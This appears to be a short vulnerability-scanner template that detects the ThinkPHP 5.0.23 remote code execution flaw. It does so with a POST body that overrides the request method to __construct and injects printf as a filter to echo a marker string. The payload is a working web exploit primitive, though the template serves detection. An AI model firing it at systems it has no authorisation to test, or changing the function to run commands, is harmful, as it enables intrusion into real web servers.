id: thinkphp5023-method-rce

info:
    name: thinkphp5023-method-rce
    author: 
    severity: high

manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /index.php?s=captcha
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                _method=__construct&filter[]=printf&method=GET&server[REQUEST_METHOD]=TmlnaHQgZ2F0aGVycywgYW5%25%25kIG5vdyBteSB3YXRjaCBiZWdpbnMu&get[]=1
        expression: response.body.bcontains(b"TmlnaHQgZ2F0aGVycywgYW5%kIG5vdyBteSB3YXRjaCBiZWdpbnMu1")
expression: r0()
